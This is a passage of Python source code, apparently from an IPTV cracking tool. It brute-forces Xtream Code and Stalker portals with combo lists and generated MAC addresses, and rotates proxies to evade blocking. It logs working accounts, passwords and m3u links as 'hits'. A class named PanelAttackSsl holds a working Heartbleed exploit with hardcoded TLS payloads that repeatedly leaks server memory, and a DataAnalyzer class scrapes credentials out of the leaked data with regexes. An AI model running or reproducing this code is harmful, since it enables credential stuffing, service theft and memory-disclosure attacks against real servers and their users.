                        my_date = datetime.now().strftime('%b %d, %Y  %I:%M %p')
                        allInfo.update({'\xf0\x9f\x8c\x8e Server': server, '\xf0\x9f\x91\xa4 User': User,
                                        '\xf0\x9f\x94\x91 Pass': Pass, '\xf0\x9f\x92\xb0 Credits': _data['credits'],
                                        '\xf0\x9f\x91\xa5 Active_acc': _data['active_accounts']})
                        allInfo.update({'\xf0\x9f\x93\x86 Scan_date': my_date,
                                        '\xe2\x9a\x99\xef\xb8\x8fModule': "Xtream Code Panel System",
                                        'FileName': fileName})
                        result = ('Good', allInfo)
                        break
                    else:
                        allInfo.update({'Server': server, 'User': User, 'Pass': Pass})
                        result = ('Bad', allInfo)
                        break
                except Exception as e:
                    allInfo.update({'Server': server, 'User': User, 'Pass': Pass, 'Error': str(e)})
                    result = ('Error', allInfo)
                    del e
                finally:
                    if Glb.result_logger is None:
                        Glb.results.put(result)
                    else:
                        Glb.result_logger(result)
            session.close()
        return

    def auto_method(self, data):
        for serv in Glb.serverList:
            if 'stalker_portal' in serv:
                self.stlk_mac(data, serv)
            else:
                self.xc_mac(data, serv)

    def xc_mac(self, data, server):
        """This is the method or script is for Xtream Code servers """

        result = tuple()
        mac = data['_data']
        session = self.requests.session()
        while True:
            allInfo = dict()
            if Glb.useProxy == 'yes':
                myProxy = Proxies().get_proxy(Glb.proxy_type)
                session.proxies.update(myProxy[1])
                allInfo.update({'ProxyUsed': myProxy[0]})
            try:
                header = self.myHeaders
                header.update({'Referer': server + '/c/',
                               'User-Agent': "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                               'X-User-Agent': "Model: MAG250; Link: WiFi"})
                udid = secrets.token_hex(16)
                cookies = {'mac': mac, 'stb_lang': "en", 'timezone': "America%2FNew_York", 'adid': udid}
                url = f'{server}/portal.php?type={self.hand_shake}'
                GetHand = session.get(url, headers=header, cookies=cookies, timeout=Glb.waitTime, allow_redirects=True)
                url_server = GetHand.url
                parsed_url = urlparse(url_server)
                real_server = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_url)
                header.update({'Referer': real_server + '/c/'})
                allInfo.update({'\xf0\x9f\x8c\x8e Server': real_server, '\xf0\x9f\x93\xbd Mac': mac})
                if GetHand.status_code == 200:
                    token = Parse().parse_btw_str(GetHand.text, 'token":"', '"')
                    header.update({'Authorization': 'Bearer ' + token})
                    GetCheck = session.get(real_server + self.xc_prof, headers=header, cookies=cookies)
                    check = GetCheck.text
                    if '\"status\":0' in check:  # Good Account
                        proxiesNone = {"http": '', "https": ''}
                        session.proxies.update(proxiesNone)
                        GetData = session.get(real_server + self.xc_cmd, headers=header, cookies=cookies)
                        getCmd = GetData.json()['js']['cmd']
                        info = getCmd.split('/')
                        user = info[3]
                        pwd = info[4]
                        List_m3u = self.urlM3u.replace('my_server', real_server).replace('my_user', user).replace(
                            'my_pwd', pwd)
                        myApi = self.urlApi.replace('my_server', real_server).replace('my_user', user).replace('my_pwd',
                                                                                                               pwd)
                        allInfo.update({'\xf0\x9f\x91\xa5 User': user, '\xf0\x9f\x94\x91 Pass': pwd})
                        try:
                            GetDate = session.get(myApi, headers=self.myHeaders)  # , proxies=proxies)
                            GetData = GetDate.json()['user_info']
                            status = GetData['status']
                            exp_parse = Parse().parse_btw_str(GetDate.text, 'exp_date":"', '"')
                            if re.search('([0-9]{10,15})', exp_parse):
                                exp_date = str(datetime.fromtimestamp(int(exp_parse)).strftime('%b %d, %Y '))
                            else:
                                exp_date = str(exp_parse)
                            max_conx = GetData['max_connections']
                            connected = GetData['active_cons']
                            if max_conx is None:
                                max_conx = 'Unknow/Unlimited \xf0\x9f\x98\xb2'
                            allInfo.update({'\xf0\x9f\x9a\xa6 Status': status, '\xe2\x8f\xb1 Exp_date': exp_date,
                                            '\xf0\x9f\x94\x8c Connected': connected,
                                            '\xf0\x9f\x9a\x8c Max_conn': max_conx})
                        except Exception as e_api:
                            try:
                                url_info = f'{real_server}/portal.php?type={self.info}'
                                Getinfo = session.get(url_info, headers=header, cookies=cookies)
                                getDate = Getinfo.json()['js']['phone']
                                if getDate is None:
                                    exp_date = 'Never \xf0\x9f\x98\xb2'
                                elif re.search('([0-9]{10,15})', getDate):
                                    exp_date = str(datetime.fromtimestamp(int(getDate)).strftime('%b %d, %Y %X %p'))
                                else:
                                    exp_date = str(getDate)
                                allInfo.update({'\xe2\x8f\xb1 Exp_date': exp_date})
                            except Exception as e_api:
                                del e_api
                        my_date = datetime.now().strftime('%b %d, %Y  %I:%M %p')
                        fileName = server.split('://')[1].split(':')[0].split('/')[0]
                        allInfo.update({'\xf0\x9f\x93\x86 Scan_date': my_date,
                                        '\xf0\x9f\x8e\xac\xf0\x9f\x94\x97 List m3u': List_m3u, 'FileName': fileName})
                        allInfo.update({'\xe2\x9a\x99\xef\xb8\x8fModule': "Xtream Code Hits System"})
                        try:
                            url_gen = f'{real_server}/portal.php?type={self.geners}'
                            categories = session.get(url_gen, headers=header, cookies=cookies)
                            categories_json = categories.json()
                            categories_list = Parse().parse_json_rec(categories_json, 'title')
                            allInfo.update({'\xf0\x9f\x93\x81 Categories': categories_list})
                        except Exception as e_cat:
                            del e_cat
                        result = ('Good', allInfo)
                        break
                    elif '\"status\":1' in check:
                        result = ('Bad', allInfo)
                        break
                    else:  # Error
                        result = ('Error', allInfo)
                else:  # Some Status_Code Errors
                    code = GetHand.status_code  # code (403) proxy not allow in the server, (502) proxy banned
                    allInfo.update({'Code': str(code)})
                    result = ('StatusCode', allInfo)
            except Exception as e:  # most like server blocked, (Caused by NewConnectionError, Caused by ConnectTimeoutError)
                try:
                    error = Parse().parse_btw_str(str(e), '>:', '))')
                    allInfo.update({'Error': error})
                    result = ('Error', allInfo)
                except Exception as e:
                    del e
            finally:
                if Glb.result_logger is None:
                    Glb.results.put(result)
                else:
                    Glb.result_logger(result)
        session.close()
        return

    def stlk_mac(self, data, server):
        """This is the method or script is for Stalkers servers """

        result = tuple()
        mac = data['_data']
        session = self.requests.session()
        while True:
            allInfo = dict()
            if Glb.useProxy == 'yes':
                myProxy = Proxies().get_proxy(Glb.proxy_type)
                session.proxies.update(myProxy[1])
                allInfo.update({'ProxyUsed': myProxy[0]})
            try:
                header = self.myHeaders
                header.update({'Referer': server + '/c/',
                               'User-Agent': "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                               'X-User-Agent': "Model: MAG250; Link: WiFi"})
                udid = secrets.token_hex(16)
                cookies = {'mac': mac, 'stb_lang': "en", 'timezone': "America%2FNew_York", 'adid': udid}
                url = f'{server}/server/load.php?type={self.hand_shake}'
                GetHand = session.get(url, headers=header, cookies=cookies, timeout=Glb.waitTime, allow_redirects=True)
                url_server = GetHand.url
                parsed_url = urlparse(url_server)
                real_server = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_url)
                header.update({'Referer': real_server + '/c/'})
                allInfo.update({'\xf0\x9f\x8c\x8e Server': real_server, '\xf0\x9f\x93\xbd Mac': mac})
                if GetHand.status_code == 200:
                    token = Parse().parse_btw_str(GetHand.text, 'token":"', '"')
                    random = Parse().parse_btw_str(GetHand.text, 'random":"', '"')
                    header.update({'Authorization': 'Bearer ' + token})
                    getstkl_prof = self.stkl_prof
                    metrics = '{"mac":"my_mac","model":"","type":"STB","uid":"","random":"my_rnd"}'.replace('my_mac',
                                                                                                            mac).replace(
                        'my_rnd', random)
                    my_metrics = urllib.parse.quote_plus(metrics, safe='', encoding=None, errors=None)
                    for r in ("my_time", str(int(time.time()))), ("my_metrics", metrics):  # ("my_metrics", my_metrics):
                        getstkl_prof = getstkl_prof.replace(*r)
                    GetCheck = session.get(server + getstkl_prof, headers=header, cookies=cookies)
                    if '\"last_watchdog\":\"' in GetCheck.text:  # Good Account
                        GetCheckData = GetCheck.json()
                        last = GetCheckData['last_watchdog']
                        if last != '0000-00-00 00:00:00':
                            user = GetCheckData['login']
                            pwd = GetCheckData['password']
                            allInfo.update({'\xf0\x9f\x91\xa5 User': user, '\xf0\x9f\x94\x91 Pass': pwd})
                            try:
                                getDate = GetCheckData['expire_billing_date']
                                if getDate is None:
                                    exp_date = 'Never \xf0\x9f\x98\xb2'
                                elif re.search('([0-9]{10,15})', getDate):
                                    exp_date = str(datetime.fromtimestamp(int(getDate)).strftime('%b %d, %Y '))
                                else:
                                    exp_date = str(getDate)
                                allInfo.update({'\xe2\x8f\xb1 Exp_date': exp_date})
                            except Exception as e:
                                del e
                            serial = hashlib.md5(mac.encode('utf-8')).hexdigest().upper()
                            device_ID = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
                            serial_cut = serial[:13]
                            sig_code = serial_cut + '+' + mac
                            sig = hashlib.sha256(sig_code.encode('utf-8')).hexdigest().upper()
                            my_date = datetime.now().strftime('%b %d, %Y  %I:%M %p')
                            allInfo.update(
                                {'Serial': serial, 'SerialCut': serial_cut, 'DeviceID': device_ID, 'Signature': sig,
                                 'Scan_date': my_date, '\xe2\x9a\x99\xef\xb8\x8fModule': "Stalker Hits System"})
                            result = ('Good', allInfo)
                            break
                        else:
                            result = ('Bad', allInfo)
                            break
                    else:  # Bad Account
                        result = ('Bad', allInfo)
                        break
                else:  # Some Status_Code Errors
                    code = GetHand.status_code  # code (403) proxy not allow in the server, (502) proxy banned
                    allInfo.update({'Code': str(code)})
                    result = ('StatusCode', allInfo)
            except Exception as e:  # most like server blocked, (Caused by NewConnectionError, Caused by ConnectTimeoutError)
                try:
                    error = Parse().parse_btw_str(str(e), '>:', '))')
                    allInfo.update({'Error': error})
                    result = ('Error', allInfo)
                except Exception as e:
                    del e
            finally:
                if Glb.result_logger is None:
                    Glb.results.put(result)
                else:
                    Glb.result_logger(result)
        session.close()
        return

    def channel_bf(self, data):
        """This is the method or script is for Brute Force m3u channel link"""

        result = tuple()
        combo = list(data.values())
        varCombo = list(filter(None, str(combo[0]).split(':')))
        for link in Glb.serverList:
            varsToreplace = Parse().parse_btw_rec(link, '<', '>')
            data_var = cycle(varCombo)
            server = link
            for var in varsToreplace:
                my_var = str()
                try:
                    my_var = next(data_var)
                except StopIteration as e:
                    pass
                server = server.replace(f'<{var}>', my_var)
            session = self.requests.session()
            while True:
                allInfo = dict()
                if Glb.useProxy == 'yes':
                    myProxy = Proxies().get_proxy(Glb.proxy_type)
                    session.proxies.update(myProxy[1])
                    allInfo.update({'ProxyUsed': myProxy[0]})
                try:
                    allInfo.update({'\xf0\x9f\x8c\x8e Server': server})
                    header = self.myHeaders
                    header.update({
                                      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"})
                    http_req = session.get(server, headers=header, allow_redirects=True)
                    reqGet = http_req.text
                    url_server = http_req.url
                    if http_req.status_code == 200 and '#EXTM3U' in reqGet:  # <===== Good Account (#EXTM3U, #EXTINF)
                        my_date = datetime.now().strftime('%b %d, %Y  %I:%M %p')
                        fileName = server.split('://')[1].split(':')[0].split('/')[0]
                        allInfo.update({'FileName': fileName, '\xf0\x9f\x94\x97 m3u_Link': url_server,
                                        '\xf0\x9f\x93\x86 Scan_date': my_date,
                                        '\xe2\x9a\x99\xef\xb8\x8fModule': "Channel Brute Force"})
                        result = ('Good', allInfo)
                        break
                    elif http_req.status_code == 200 and reqGet != '#EXTM3U':  # <===== Bad Account
                        allInfo.update({'Server': server})
                        result = ('Bad', allInfo)
                        break
                    else:
                        allInfo.update({'Code': str(http_req.status_code)})
                        result = ('StatusCode', allInfo)
                except Exception as e:
                    try:
                        error = e.args[0]
                        allInfo.update({'Server': server, 'Error': error})
                        result = ('Error', allInfo)
                        if 'Exceeded 30 redirects.' in error:  # TooManyRedirects
                            result = ('Bad', allInfo)
                            break
                    except Exception as e:
                        del e
                finally:
                    if Glb.result_logger is None:
                        Glb.results.put(result)
                    else:
                        Glb.result_logger(result)
            session.close()
        return


class Thread:
    """This Class contain all initial methods on preparation for the parallel system"""

    def __init__(self, **kwarg):
        self.threads = Glb.threadMain
        self.credentials = kwarg['wrl']
        self.servers = kwarg['servlist']
        self.my_iter = None
        self.load_combo()
        self.load_servers()
        self.load_proxies()
        Requirements().selfcheck()
        if Glb.servers_length > 0:
            Glb.totalToCheck = Glb.servers_length * Glb.combo_length
        else:
            Glb.totalToCheck = Glb.combo_length

    def load_combo(self):
        try:
            with open(Glb.combo_path, 'r', errors='ignore') as file:
                for i in range(Glb.start_combo):
                    _ = next(file, 1)
                for i in range(10000):
                    line = next(file).replace('\n', '')
                    if (Glb.scan_mode == 'up' or Glb.scan_mode == 'panel') and line.count(':') == 1:
                        self.credentials.append({'_data': line})
                        self.my_iter = self.credentials
                    elif Glb.scan_mode == 'mac' and line.count(':') == 5:
                        self.credentials.append({'_data': line})
                        self.my_iter = self.credentials
                    elif Glb.scan_mode == 'channel':
                        self.credentials.append({'_data': line})
                        self.my_iter = self.credentials
                    elif Glb.scan_mode == 'netflix' and line.count(':') == 1:
                        self.credentials.append({'_data': line})
                        self.my_iter = self.credentials
        except StopIteration as stop_e:
            Glb.combo_length = Glb.start_combo + len(self.credentials)  # for reload 10000 credentials
            del stop_e
        except OSError as e:
            del e
            flag = len(Glb.comboList)
            if flag > 0:
                self.credentials = Glb.comboList
                Glb.combo_length = flag
                self.my_iter = self.credentials
            elif Glb.mac_auth is True:
                Glb.combo_length = 16 ** Glb.mac_fill
                end_range = Glb.start_combo + min(10000, ((16 ** Glb.mac_fill) - Glb.start_combo))
                if Glb.mac_rnd:
                    if Glb.combo_length > 1048576:  # 16**5
                        my_iter = [random.randrange(0, Glb.combo_length) for i in range(Glb.start_combo, end_range)]
                    else:
                        if Glb.start_combo == 0:
                            Glb.list_rnd_mac = list(range(Glb.combo_length))
                            random.shuffle(Glb.list_rnd_mac)
                        my_iter = islice(Glb.list_rnd_mac, Glb.start_combo, end_range)
                else:
                    my_iter = range(Glb.start_combo, end_range)  # <-- final range for interator
                self.my_iter = [self.mac_generator(item) for item in my_iter]

            elif Glb.scan_mode == 'channel':
                end_range = Glb.start_combo + min(10000, (max(Glb.channel_inter) + 1 - Glb.start_combo))
                start_range = Glb.start_combo + min(Glb.channel_inter)
                my_iter = range(start_range, end_range)
                [self.credentials.append({'_data': item}) for item in my_iter]
                self.my_iter = self.credentials
            else:
                Glb.running = False
                Display().error_msg(f'{Glb.YELLOW}Please make sure your combo file exist {Glb.RESET} and start again')
                input('Please press ENTER to continue')
                return StartApp().re_startApp()

    def load_servers(self):
        if Glb.scan_mode != 'netflix':
            try:
                with open(Glb.servers_path, errors='ignore') as (f):
                    linesS = f.read().split('\n')
                for server in linesS:
                    if server.count('://') == 1:
                        Glb.serverList.append(server)
                Glb.serverList = list(set(Glb.serverList))
                Glb.servers_length = len(Glb.serverList)
            except OSError as e:
                del e
            finally:
                if len(Glb.serverList) == 0:
                    Display().error_msg('Something happened with your server file, Please start again')
                    input('Please press ENTER to continue')
                    return StartApp().re_startApp()

    def load_proxies(self):
        try:
            if Glb.useProxy == 'yes':
                if Glb.useFreeProxies == 'yes':
                    import requests
                    proxyType = Glb.proxy_type
                    urlapi = f'https://api.proxyscrape.com/?request=getproxies&proxytype={proxyType}&timeout=10000&country=all&ssl=all&anonymity=all'
                    myHeaders = {'Connection': "keep-alive",
                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
                                 'Accept': "*/*"}
                    try:
                        response = requests.get(urlapi, headers=myHeaders, timeout=Glb.waitTime, allow_redirects=True)
                        data = response.text
                        proxies = data.split('\r\n')
                        for proxy in proxies:
                            if re.search(r"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+)", proxy):
                                Glb.proxyList.append(proxy)
                        Glb.proxy_length = len(Glb.proxyList)
                        Glb.proxy_pool = cycle(Glb.proxyList)
                    except Exception as pe:
                        Display().error_msg(
                            'Something happened, no free proxies available\nPlease start again and use your own proxy file')
                        print(pe)
                        input('Please press ENTER to continue')
                        return StartApp().re_startApp()
                else:
                    with open(Glb.proxy_path, 'r', errors='ignore') as (f):
                        linesP = f.read().split('\n')
                    for proxy in linesP:
                        if proxy.count('.') == 3:
                            Glb.proxyList.append(proxy)
                        elif proxy.count(':') == 3:
                            Glb.proxyList.append(proxy)
                    Glb.proxy_length = len(Glb.proxyList)
                    Glb.proxy_pool = cycle(Glb.proxyList)
        except OSError as e:
            Display().error_msg(str(e) + '\nSomething happened with your proxy file, Please start again')
            del e
            input('Please press ENTER to continue')
            return StartApp().re_startApp()

    def mac_generator(self, enumerator):
        hex_num = hex(enumerator)[2:].zfill(Glb.mac_fill)
        fmac = (Glb.mac_pattern + hex_num).upper()
        macCombo = "{}{}:{}{}:{}{}:{}{}:{}{}:{}{}".format(*fmac)
        return {'_data': macCombo}

    def display(self, loggerfunc):
        if len(Glb.dsp_update_thd) < 1:
            Display().start_time()
            dsp_update = threading.Thread(target=loggerfunc, daemon=True)
            dsp_update.start()
            Glb.dsp_update_thd.append(dsp_update)

    def threads_poll(self, my_func):
        if Glb.host == 'TERMUX':
            live_threads = []

            def thread_creator():
                threads = [threading.Thread(target=my_func, kwargs={'data': _}, daemon=True) for _ in self.my_iter]
                thread_index = 0
                while len(threads) - 1 >= thread_index:
                    death_thread = []
                    if len(live_threads) < self.threads:
                        for x in range(min(self.threads - len(live_threads), len(threads))):
                            threads[thread_index].start()
                            live_threads.append(threads[thread_index])
                            Glb.start_combo += 1
                            thread_index += 1
                    for thread_death in live_threads:
                        if thread_death.is_alive():
                            pass
                        else:
                            death_thread.append(thread_death)
                    for _ in death_thread:
                        live_threads.remove(_)
                    time.sleep(.1)
                if Glb.start_combo < Glb.combo_length:
                    thread_creator()
                else:
                    for thrd in live_threads:
                        thrd.join()

            if Glb.start_combo < Glb.combo_length and Glb.running is True:
                thread_creator()
        else:
            pool = Pool(self.threads)
            for bot in pool.imap_unordered(func=my_func, iterable=self.my_iter):
                Glb.start_combo += 1
                if Glb.running is False:
                    break
        if Glb.start_combo < Glb.combo_length and Glb.running is True:
            self.credentials.clear()
            self.load_combo()
            self.threads_poll(my_func)
        else:
            Glb.running = False
            for th in Glb.dsp_update_thd:
                th.join()
            StartApp().all_done()

    def main(self):
        my_func = None
        my_logger = None
        if Glb.scan_mode == 'up':
            my_func = Modules().iptv_user_pass
            my_logger = Result().logger_iptv
        elif Glb.scan_mode == 'mac':
            my_func = Modules().auto_method
            my_logger = Result().logger_iptv
        elif Glb.scan_mode == 'panel':
            my_func = Modules().xc_panels
            my_logger = Result().logger_iptv
        elif Glb.scan_mode == 'channel':
            my_func = Modules().channel_bf
            my_logger = Result().logger_iptv
        elif Glb.scan_mode == 'netflix':
            my_func = Modules().netflix
            my_logger = None
        Glb.running = True
        Display().ak_UI('relax')
        if Glb.SystemName == 'Darwin':
            Glb.result_logger = Result().logger
        else:
            self.display(my_logger)  # <- Original
        self.threads_poll(my_func=my_func)


class TaskThread(threading.Thread):
    def __init__(self, method, args, results_queue, demon=False):
        super().__init__()
        self.method = method
        self.args = args
        self.results_queue = results_queue
        self.daemon = demon

    def run(self):
        result = self.method(*self.args)
        self.results_queue.put(result)


class ThreadPollManager:
    def __init__(self, task_func, max_threads, hitlogger_fun=None, dataAnalizer_func=False, set_wait=True):
        self.task_func = task_func
        self.max_threads = max_threads
        self.dataAnalizer_func = dataAnalizer_func
        self.hitlogger_func = hitlogger_fun
        self.results_queue = queue.Queue()
        self.task_threads = []
        self.wait_flag = set_wait

    def process_results(self):  # hit_logger
        while True:
            result = self.results_queue.get()
            if result == "Stop Processing Results":  # Signal to stop processing results
                break
            if self.hitlogger_func is not None:
                self.hitlogger_func(result)
            self.results_queue.task_done()

    def thread_pool(self, args, demon=False):
        with self.results_queue.mutex:
            self.results_queue.queue.clear()  # Clear the results queue
        thredNumber = 0
        for arg in args:
            thread = TaskThread(self.task_func, arg, self.results_queue, demon=demon)
            thread.start()
            self.task_threads.append(thread)
            if len(self.task_threads) >= self.max_threads:
                self.task_threads[0].join()
                self.task_threads.pop(0)
            thredNumber += 1

        # Wait for all tasks to be processed
        if Glb.debug:
            print("all task has been created waiting to finish")
        self.results_queue.join()
        Glb.dataToAnalyze.join()
        if Glb.debug:
            print("all task finished")

        # Stop the processing thread
        if self.hitlogger_func is not None:
            self.results_queue.put("Stop Processing Results")
        if self.dataAnalizer_func:
            Glb.dataToAnalyze.put("Stop Analyzing Results")

    def run(self, iterable, demon=False):
        if self.hitlogger_func is not None:
            hitlogger_thread = threading.Thread(target=self.process_results)
            hitlogger_thread.start()

        if self.wait_flag:
            self.thread_pool(iterable, demon=demon)
        else:
            no_wait_thread = threading.Thread(target=self.thread_pool(iterable, demon=demon), daemon=True)
            no_wait_thread.start()
        return True


class PanelAttackSsl:
    hello = ''' 
            16 03 02 00  dc 01 00 00 d8 03 02 53
            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
            00 0f 00 01 01                                  
            '''
    hb = ''' 
            18 03 02 00 03
            01 40 00
            '''

    def decoceStringToHEX(self, data):
        decode_hex = codecs.getdecoder('hex_codec')
        return decode_hex(data.replace(' ', '').replace('\n', ''))[0]

    def hexdump(self, s):
        for b in range(0, len(s), 16):
            lin = [c for c in s[b: b + 16]]
            hxdat = ' '.join('%02X' % c for c in lin)
            pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
            if Glb.debug:
                print('  %04x: %-48s %s' % (b, hxdat, pdat))

    def recvall(self, s, length, timeout=5):
        endtime = time.time() + timeout
        rdata = b''
        try:
            remain = length
            while remain > 0:
                rtime = endtime - time.time()
                if rtime < 0:
                    return None
                r, w, e = select.select([s], [], [], 5)
                if s in r:
                    data = s.recv(remain)
                    # EOF?
                    if not data:
                        return None
                    rdata += data
                    remain -= len(data)
            return rdata
        except Exception as err:
            if Glb.debug:
                print("recvall--->Error reading socket data", err, str(s.getpeername()))
            return None

    def recvmsg(self, s):
        hdr = self.recvall(s, 5)
        if hdr is None:
            if Glb.debug:
                print('HDR Unexpected EOF receiving record header - server closed connection', str(s.getpeername()))
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = self.recvall(s, ln, 10)
        if pay is None:
            if Glb.debug:
                print('payload Unexpected EOF receiving record payload - server closed connection',
                      str(s.getpeername()))
            return None, None, None
        # print('received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
        return typ, ver, pay

    def do_hb_new(self, s, server):
        while True:
            if Glb.debug:
                print(Glb.WHITE_L + "Reading data from server" + Glb.GREEN + str(s.getpeername()) + Glb.RESET)
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                if Glb.debug:
                    print("No heartbeat response received, server likely not vulnerable")
                return False

            if typ == 24:
                # print 'Received heartbeat response'
                if len(pay) > 3:
                    pdat = "".join((chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else "") for c in pay)

                    if len(pdat) > 50:  # We only put things that can have relevant information, the small data does not count
                        Glb.dataToAnalyze.put([server, pdat])
                        # FileWork().file_write(filepath=Glb.myPath, data=pdat, filename="Braun_Debug.txt", mode="a+")
                else:
                    if Glb.debug:
                        print('Server processed malformed heartbeat, but did not return any extra data.')
                return True

            if typ == 21:
                if Glb.debug:
                    print('Received alert')

    def checkHB(self, url: str, port: int, sock: socket) -> bool:
        # Method that verifies the vulnerability of the server
        print("Verifying vulnerability of:", url, "and port ", str(port))
        sock.connect((url, port))
        sys.stdout.flush()
        sock.send(self.decoceStringToHEX(self.hello))
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = self.recvmsg(sock)
            if typ is not None:
                if Glb.debug:
                    print("Received message: type = {}, version = {}".format(typ, hex(ver)))
                    print("Verifying heartbeat pay", pay, " pos 0:", pay[0], "--->", 0x0E)
                time.sleep(1)
                if typ == 22 and pay[0] == 0x0E:
                    if Glb.debug:
                        print('Sending heartbeat request...')
                    sys.stdout.flush()
                    data = self.decoceStringToHEX(self.hb)
                    sock.send(data)
                    if self.hit_hb(sock):
                        return True
            else:
                print('Server closed connection.')  # without sending Server Hello.')
                _continue = False
            # Look for server hello done message.

    def hit_hb(self, s):
        data = self.decoceStringToHEX(self.hb)
        s.send(data)
        while True:
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                print('No heartbeat response received, server likely not vulnerable')
                return False
            if typ == 24:
                print('Received HB response:')
                self.hexdump(pay)
                if len(pay) > 3:
                    print('Server is vulnerable!')
                else:
                    print('Server processed malformed heartbeat, but did not return any extra data.')
                return True
            if typ == 21:
                print('Received alert:')
                self.hexdump(pay)
                print('Server returned error, likely not vulnerable')
                return False

    def startAttack(self, server: str, ip: str, port: int):
        while True:
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((ip, port))
                s.send(self.decoceStringToHEX(self.hello))
                while True:
                    typ, ver, pay = self.recvmsg(s)
                    if typ is None:
                        if Glb.debug:
                            print('Server closed connection.')
                        return
                    # Look for server hello message.
                    if typ == 22 and (pay[0]) == 0x0E:
                        break
                s.send(self.decoceStringToHEX(self.hb))
                while self.do_hb_new(s, server):
                    continue
            except Exception as err:
                if Glb.debug:
                    print("Error creating the connection, we keep trying:", err)


class DataAnalyzer:

    def __init__(self):
        self.patron_USER_PASS = r"username=[A-z0-9_*!\xc2\xa1@$?\xc2\xbf:\-\.@]*\&password=[A-z0-9_*!\xc2\xa1@$?\xc2\xbf:\-\.@]*"
        self.patron_LIST_M3U = r"https?:\/[\/A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]{3,}"  # https?://([A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]*/){3,}([A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]*)
        self.patron_REQUEST_URI = r"username=([A-z0-9_*!\xc2\xa1@$?\xc2\xbf:\-\.@]*\&password=[A-z0-9_*!\xc2\xa1@$?\xc2\xbf:\-\.@]*)(REQUEST_METHOD)"
        self.patron_TOKEN = r"https?:\/\/[A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\/]{4,}\/[A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]*token"
        self.patron_LIVE = r"live\/[A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]{2,}\/[A-z0-9_*!\xc2\xa1@$?\xc2\xbf\-]{2,}"
        self.patron_EXTINF = r"\/([A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]*/){4,}([A-z0-9_*!\xc2\xa1@$?.%\xc2\xbf:\-]*)#EXTINF"
        # patron_EXTINF2 = r"=\/([^=\/]+)\/.*?\.ts|([A-z0-9]){2,}.token"
        self.patronToSearch = {self.patron_USER_PASS: self.ext_UserPass, self.patron_LIST_M3U: self.ext_ListM3U,
                               self.patron_REQUEST_URI: self.ext_ReqURI, self.patron_TOKEN: self.ext_ReqTOKEN,
                               self.patron_LIVE: self.ext_ReqLIVE, self.patron_EXTINF: self.ext_ReqEXTINF}

    def ext_UserPass(self, data: str) -> tuple:
        try:
            info = data.split("username=")
            infoList = (info[1].split("&password="))
            user = infoList[0]
            passw = infoList[1]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing ListM3U extract data:" + str(
                    e) + " Datos de entrada:" + data + Glb.RESET)
            return "", ""

    def ext_ListM3U(self, data: str) -> tuple:
        try:
            info = data.split("/")
            user = info[3]
            passw = info[4]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing extract_ListM3U:" + str(e) + "\ninput data:" + data + Glb.RESET)
            return "", ""

    def ext_ReqURI(self, data: str) -> tuple:
        try:
            info = data.split("/")
            user = info[1]
            passw = info[2]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing extract_ReqURI :" + str(e) + "\nInput data:" + data + Glb.RESET)
            return "", ""

    def ext_ReqTOKEN(self, data: str) -> tuple:
        try:
            dataList = data.split("/")
            user = dataList[3]
            passw = dataList[4]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing extract_ReqTOKEN:" + str(e) + "\nInput data:" + data + Glb.RESET)
            return "", ""

    def ext_ReqLIVE(self, data: str) -> tuple:
        try:
            dataList = data.split("/")
            user = dataList[1]
            passw = dataList[2]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing extract_ReqLIVE:" + str(
                    e) + "\nInput data:" + data + Glb.RESET)
            return "", ""

    def ext_ReqEXTINF(self, data: str) -> tuple:
        try:
            dataList = data.split("/")
            user = dataList[3]
            passw = dataList[4]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing extract_ReqEXTINF:" + str(
